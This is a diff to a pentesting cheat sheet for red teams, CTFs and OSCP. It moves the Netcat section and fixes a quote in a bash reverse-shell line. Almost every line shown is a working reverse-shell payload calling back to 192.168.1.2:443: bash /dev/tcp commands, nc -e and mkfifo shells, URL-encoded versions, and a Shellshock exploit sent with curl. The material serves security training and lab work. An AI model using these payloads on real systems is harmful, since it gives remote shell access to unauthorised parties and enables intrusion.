@@ -8,9 +8,25 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```cmd
   bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 
-  bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1
+  bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
   
   bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
+  ```
+  
+`Netcat`
+
+  ```cmd
+  nc -e /bin/sh 192.168.1.2 443
+
+  nc -e /bin/bash 192.168.1.2 443
+
+  nc -c bash 192.168.1.2 443
+  
+  nc.exe -e cmd 192.168.1.26 443
+
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+  
+  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
   ```
   
 `PHP Web Shell`
@@ -54,22 +70,6 @@ __Pentesting - Red Team - CTFs - OSCP__
   curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
   ```
   
-`Netcat`
-
-  ```cmd
-  nc -e /bin/sh 192.168.1.2 443
-
-  nc -e /bin/bash 192.168.1.2 443
-
-  nc -c bash 192.168.1.2 443
-  
-  nc.exe -e cmd 192.168.1.26 443
-
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
-  
-  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
-  ```
-
 `Perl`
 
   ```cmd
